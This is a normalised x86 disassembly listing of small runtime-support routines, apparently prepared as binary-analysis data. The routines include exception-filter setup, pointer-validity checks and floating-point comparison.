call sub_4114a6
pop ecx
pop ecx
retn
sub_40f692
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_40f965
push [ esp + 0x10 ]
mov [ rw-data ] 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40f6e8
and [ rw-data ] 0x0
add esp 0x10
retn
sub_40f98c
push [ esp + 0xc ]
mov [ rw-data ] 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40f7ec
and [ rw-data ] 0x0
add esp 0xc
retn
sub_40faf0
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_40fbd8
push rw-data
push rw-data
call sub_40fbd8
add esp 0x10
retn
call eax
sub_40fb1d
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_40fb3f
add esp 0xc
retn
sub_40fb2e
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40fb3f
add esp 0xc
retn
sub_410479
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_40c1c6
add esp 0x8
pop ebp
retn 0x4
sub_410666
push sub_410620
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_410677
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_410684
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4106a0
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_4106bc
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_410b9a
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 8 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_410c65
call sub_40e590
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_412380
sub_410f4e
push 0x1
pop eax
retn
sub_4114a6
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_411471
pop ecx
pop ecx
retn
sub_41193d
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4117d1
add esp 0xc
retn
sub_411953
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_4117d1
add esp 0xc
retn
sub_411c51
push 0x2
call sub_40cae3
pop ecx
retn
sub_411c5a
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_411c6b
add esp 0xc
retn
sub_412060
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_411c9c
pop ecx
mov [ rw-data ] 0x1
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_413190
mov eax r--data
jmp sub_40bf2f
